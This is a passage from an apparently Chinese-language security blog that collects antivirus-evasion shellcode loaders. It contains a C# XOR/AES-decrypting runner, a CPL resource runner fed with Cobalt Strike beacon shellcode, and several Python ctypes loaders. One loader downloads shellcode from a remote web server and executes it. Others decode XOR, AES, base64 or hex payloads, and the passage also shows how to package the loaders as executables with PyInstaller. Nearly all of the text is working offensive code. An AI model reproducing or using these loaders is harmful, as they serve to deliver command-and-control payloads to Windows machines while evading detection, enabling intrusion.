class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Author: Arno0x0x, Twitter: @Arno0x0x</span><br><span class="line"></span><br><span class="line">How to compile:</span><br><span class="line">===============</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:encryptedShellcodeWrapper_xor.exe encryptedShellcodeWrapper_xor.cs</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Threading.Tasks;</span><br><span class="line">using System.Security.Cryptography;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line">namespace RunShellCode</span><br><span class="line">&#123;</span><br><span class="line">    static class Program</span><br><span class="line">    &#123;</span><br><span class="line">        //==============================================================================</span><br><span class="line">        // CRYPTO FUNCTIONS</span><br><span class="line">        //==============================================================================</span><br><span class="line">        private static T[] SubArray&lt;T&gt;(this T[] data, int index, int length)</span><br><span class="line">        &#123;</span><br><span class="line">            T[] result = new T[length];</span><br><span class="line">            Array.Copy(data, index, result, 0, length);</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static byte[] xor(byte[] cipher, byte[] key) &#123;</span><br><span class="line">            byte[] decrypted = new byte[cipher.Length];</span><br><span class="line"></span><br><span class="line">            for(int i = 0; i &lt; cipher.Length; i++) &#123;</span><br><span class="line">                decrypted[i] = (byte) (cipher[i] ^ key[i % key.Length]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return decrypted;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //--------------------------------------------------------------------------------------------------</span><br><span class="line">        // Decrypts the given a plaintext message byte array with a given 128 bits key</span><br><span class="line">        // Returns the unencrypted message</span><br><span class="line">        //--------------------------------------------------------------------------------------------------</span><br><span class="line">        private static byte[] aesDecrypt(byte[] cipher, byte[] key)</span><br><span class="line">        &#123;</span><br><span class="line">            var IV = cipher.SubArray(0, 16);</span><br><span class="line">            var encryptedMessage = cipher.SubArray(16, cipher.Length - 16);</span><br><span class="line"></span><br><span class="line">            // Create an AesManaged object with the specified key and IV.</span><br><span class="line">            using (AesManaged aes = new AesManaged())</span><br><span class="line">            &#123;</span><br><span class="line">                aes.Padding = PaddingMode.PKCS7;</span><br><span class="line">                aes.KeySize = 128;</span><br><span class="line">                aes.Key = key;</span><br><span class="line">                aes.IV = IV;</span><br><span class="line"></span><br><span class="line">                using (MemoryStream ms = new MemoryStream())</span><br><span class="line">                &#123;</span><br><span class="line">                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))</span><br><span class="line">                    &#123;</span><br><span class="line">                        cs.Write(encryptedMessage, 0, encryptedMessage.Length);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    return ms.ToArray();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //==============================================================================</span><br><span class="line">        // MAIN FUNCTION</span><br><span class="line">        //==============================================================================</span><br><span class="line">        static void Main()</span><br><span class="line">        &#123;</span><br><span class="line">            byte[] encryptedShellcode = new byte[] &#123; &#125;;</span><br><span class="line">            string key = &quot;uknowsec&quot;;</span><br><span class="line">            string cipherType = &quot;xor&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            byte[] shellcode = null;</span><br><span class="line"></span><br><span class="line">            //--------------------------------------------------------------</span><br><span class="line">            // Decrypt the shellcode</span><br><span class="line">            if (cipherType == &quot;xor&quot;) &#123;</span><br><span class="line">                shellcode = xor(encryptedShellcode, Encoding.ASCII.GetBytes(key));</span><br><span class="line">            &#125;</span><br><span class="line">            else if (cipherType == &quot;aes&quot;) &#123;</span><br><span class="line">                shellcode = aesDecrypt(encryptedShellcode, Convert.FromBase64String(key));</span><br><span class="line">            &#125;</span><br><span class="line">                        </span><br><span class="line">            //--------------------------------------------------------------        	</span><br><span class="line">            // Copy decrypted shellcode to memory</span><br><span class="line">            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">            IntPtr hThread = IntPtr.Zero;</span><br><span class="line">            UInt32 threadId = 0;</span><br><span class="line"></span><br><span class="line">            // Prepare data</span><br><span class="line">            IntPtr pinfo = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">            // Invoke the shellcode</span><br><span class="line">            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">            WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static UInt32 MEM_COMMIT = 0x1000;</span><br><span class="line">        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;</span><br><span class="line"></span><br><span class="line">        // The usual Win32 API trio functions: VirtualAlloc, CreateThread, WaitForSingleObject</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 VirtualAlloc(</span><br><span class="line">            UInt32 lpStartAddr,</span><br><span class="line">            UInt32 size,</span><br><span class="line">            UInt32 flAllocationType,</span><br><span class="line">            UInt32 flProtect</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern IntPtr CreateThread(</span><br><span class="line">            UInt32 lpThreadAttributes,</span><br><span class="line">            UInt32 dwStackSize,</span><br><span class="line">            UInt32 lpStartAddress,</span><br><span class="line">            IntPtr param,</span><br><span class="line">            UInt32 dwCreationFlags,</span><br><span class="line">            ref UInt32 lpThreadId</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 WaitForSingleObject(</span><br><span class="line">            IntPtr hHandle,</span><br><span class="line">            UInt32 dwMilliseconds</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="从资源里加载shelllcode">从资源里加载shelllcode</span></h3><p><a href="https://github.com/rvrsh3ll/CPLResourceRunner" target="_blank" rel="noopener">https://github.com/rvrsh3ll/CPLResourceRunner</a></p>
<p>用Cobalt Strike 生成shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Attacks -&gt; Packages -&gt; Windows Executable (s) -&gt; Output =&gt; RAW (x86)</span><br></pre></td></tr></table></figure>
<p>用ConvertShellcode.py将生成的 beacon.bin转换成shellcode.txt</p>
<p>然后再转换成base64编码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# python ConvertShellcode.py beacon.bin </span><br><span class="line">Shellcode written to shellcode.txt</span><br><span class="line">root@kali:~/Desktop# cat shellcode.txt |sed &apos;s/[, ]//g; s/0x//g;&apos; |tr -d &apos;\n&apos; |xxd -p -r |gzip -c |base64 &gt; b64shellcode.txt</span><br></pre></td></tr></table></figure>
<p>把生成的base64编码的shellcode复制到项目资源Resources.txt里</p>
<p>编译生成dll。</p>
<p>copy CPLResourceRunner.dll to RunMe.cpl</p>
<p><a href="http://www.anquan.us/static/drops/tips-16042.html" target="_blank" rel="noopener">三好学生-CPL文件利用介绍</a></p>
<h2><span id="python">Python</span></h2><h3><span id="源码加载">源码加载</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从我们的web服务器上下载shellcode</span></span><br><span class="line">url = <span class="string">"http://rinige.com/shellcode.bin"</span></span><br><span class="line">response = urllib2.urlopen(url)</span><br><span class="line"><span class="comment"># base64 解码 shellcode</span></span><br><span class="line">shellcode = base64.b64decode(response.read())</span><br><span class="line"><span class="comment"># 申请内存空间</span></span><br><span class="line">shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))</span><br><span class="line"><span class="comment"># 创建 shellcode 的函数指针</span></span><br><span class="line">shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE¬</span><br><span class="line">(ctypes.c_void_p))</span><br><span class="line"><span class="comment"># 执行 shellcode</span></span><br><span class="line">shellcode_func()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">shellcode = bytearray(&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b&quot;)</span><br><span class="line"></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line"> </span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line"></span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line"> </span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
<p>PyInstaller将py转为exe</p>
<p>pyinstaller同样可以将.py程序打包成windows下可以执行的exe文件。<br>pyinstaller依赖于pywin32，在使用pyinstaller之前，应先安装pywin32</p>
<p>pywin32下载后，点击下一步安装即可<br><a href="https://sourceforge.net/projects/pywin32/files/pywin32" target="_blank" rel="noopener">https://sourceforge.net/projects/pywin32/files/pywin32</a><br>pyinstaller 下载后，解压，不用安装，即可使用<br><a href="https://github.com/pyinstaller/pyinstaller/releases" target="_blank" rel="noopener">https://github.com/pyinstaller/pyinstaller/releases</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstaller -F -w pyshellcode.py</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_10.png" alt=""></p>
<p>生成的exe文件3MB。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_11.png" alt=""></p>
<h4><span id="xor加密">xor加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf8 -*-</span><br><span class="line"># Author: Arno0x0x, Twitter: @Arno0x0x</span><br><span class="line">#</span><br><span class="line"># You can create a windows executable: pyinstaller --onefile --noconsole multibyteEncodedShellcode.py</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from ctypes import *</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">#======================================================================================================</span><br><span class="line">#											CRYPTO FUNCTIONS</span><br><span class="line">#======================================================================================================</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------</span><br><span class="line"># data as a bytearray</span><br><span class="line"># key as a string</span><br><span class="line">def xor(data, key):</span><br><span class="line">	l = len(key)</span><br><span class="line">	keyAsInt = map(ord, key)</span><br><span class="line">	return bytes(bytearray((</span><br><span class="line">	    (data[i] ^ keyAsInt[i % l]) for i in range(0,len(data))</span><br><span class="line">	)))</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------</span><br><span class="line">def unpad(s):</span><br><span class="line">	&quot;&quot;&quot;PKCS7 padding removal&quot;&quot;&quot;</span><br><span class="line">	return s[:-ord(s[len(s)-1:])]</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------</span><br><span class="line">def aesDecrypt(cipherText, key):</span><br><span class="line">	&quot;&quot;&quot;Decrypt data with the provided key&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">	# Initialization Vector is in the first 16 bytes</span><br><span class="line">	iv = cipherText[:AES.block_size]</span><br><span class="line"></span><br><span class="line">	cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">	return unpad(cipher.decrypt(cipherText[AES.block_size:]))</span><br><span class="line"></span><br><span class="line">#======================================================================================================</span><br><span class="line">#											MAIN FUNCTION</span><br><span class="line">#======================================================================================================</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line"></span><br><span class="line">	encryptedShellcode = (&quot;&quot;)</span><br><span class="line">	key = &quot;uknowsec&quot;</span><br><span class="line">	cipherType = &quot;xor&quot;</span><br><span class="line"></span><br><span class="line">	# Decrypt the shellcode</span><br><span class="line">	if cipherType == &apos;xor&apos;:</span><br><span class="line">		shellcode = xor(bytearray(encryptedShellcode), key)</span><br><span class="line">	elif cipherType == &apos;aes&apos;:</span><br><span class="line">		key = base64.b64decode(key)</span><br><span class="line">		shellcode = aesDecrypt(encryptedShellcode, key)</span><br><span class="line">	else:</span><br><span class="line">		print &quot;[ERROR] Unknown cipher type&quot;</span><br><span class="line"></span><br><span class="line">	# Copy the shellcode to memory and invoke it</span><br><span class="line">	memory_with_shell = create_string_buffer(shellcode, len(shellcode))</span><br><span class="line">	shell = cast(memory_with_shell,CFUNCTYPE(c_void_p))</span><br><span class="line">	shell()</span><br></pre></td></tr></table></figure>
<h4><span id="aes加密">aes加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf8 -*-</span><br><span class="line"># Author: Arno0x0x, Twitter: @Arno0x0x</span><br><span class="line">#</span><br><span class="line"># You can create a windows executable: pyinstaller --onefile --noconsole multibyteEncodedShellcode.py</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from ctypes import *</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">#======================================================================================================</span><br><span class="line">#											CRYPTO FUNCTIONS</span><br><span class="line">#======================================================================================================</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------</span><br><span class="line"># data as a bytearray</span><br><span class="line"># key as a string</span><br><span class="line">def xor(data, key):</span><br><span class="line">	l = len(key)</span><br><span class="line">	keyAsInt = map(ord, key)</span><br><span class="line">	return bytes(bytearray((</span><br><span class="line">	    (data[i] ^ keyAsInt[i % l]) for i in range(0,len(data))</span><br><span class="line">	)))</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------</span><br><span class="line">def unpad(s):</span><br><span class="line">	&quot;&quot;&quot;PKCS7 padding removal&quot;&quot;&quot;</span><br><span class="line">	return s[:-ord(s[len(s)-1:])]</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------</span><br><span class="line">def aesDecrypt(cipherText, key):</span><br><span class="line">	&quot;&quot;&quot;Decrypt data with the provided key&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">	# Initialization Vector is in the first 16 bytes</span><br><span class="line">	iv = cipherText[:AES.block_size]</span><br><span class="line"></span><br><span class="line">	cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">	return unpad(cipher.decrypt(cipherText[AES.block_size:]))</span><br><span class="line"></span><br><span class="line">#======================================================================================================</span><br><span class="line">#											MAIN FUNCTION</span><br><span class="line">#======================================================================================================</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line"></span><br><span class="line">	encryptedShellcode = (&quot;&quot;)</span><br><span class="line">	key = &quot;Nv78rga+vzeTO+acx4EXCw==&quot;</span><br><span class="line">	cipherType = &quot;aes&quot;</span><br><span class="line"></span><br><span class="line">	# Decrypt the shellcode</span><br><span class="line">	if cipherType == &apos;xor&apos;:</span><br><span class="line">		shellcode = xor(bytearray(encryptedShellcode), key)</span><br><span class="line">	elif cipherType == &apos;aes&apos;:</span><br><span class="line">		key = base64.b64decode(key)</span><br><span class="line">		shellcode = aesDecrypt(encryptedShellcode, key)</span><br><span class="line">	else:</span><br><span class="line">		print &quot;[ERROR] Unknown cipher type&quot;</span><br><span class="line"></span><br><span class="line">	# Copy the shellcode to memory and invoke it</span><br><span class="line">	memory_with_shell = create_string_buffer(shellcode, len(shellcode))</span><br><span class="line">	shell = cast(memory_with_shell,CFUNCTYPE(c_void_p))</span><br><span class="line">	shell()</span><br></pre></td></tr></table></figure>
<h4><span id="base64加密">base64加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import ctypes</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">encode_shellcode = &quot;&quot;</span><br><span class="line"></span><br><span class="line">shellcode = base64.b64decode(encode_shellcode)</span><br><span class="line"></span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -1)</span><br></pre></td></tr></table></figure>
<h3><span id="加载器">加载器</span></h3><p><a href="https://www.cnblogs.com/k8gege/p/11223393.html" target="_blank" rel="noopener">Python免杀ShellCode加载器(Cobaltstrike/Metasploit)</a></p>
<h4><span id="hex加密">HEX加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#scrun by k8gege</span><br><span class="line">import ctypes</span><br><span class="line">import sys</span><br><span class="line">#calc.exe</span><br><span class="line">#sc = &quot;DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4&quot;</span><br><span class="line">shellcode=bytearray(sys.argv[1].decode(&quot;hex&quot;))</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line">  </span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">  </span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">  </span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line">  </span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
<h4><span id="base64加密">base64加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#scrun by k8gege</span><br><span class="line">import ctypes</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">#calc.exe</span><br><span class="line">#REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUEwQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkNCRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA==</span><br><span class="line">shellcode=bytearray(base64.b64decode(sys.argv[1]).decode(&quot;hex&quot;))</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line">  </span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">  </span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">  </span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line">  </span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
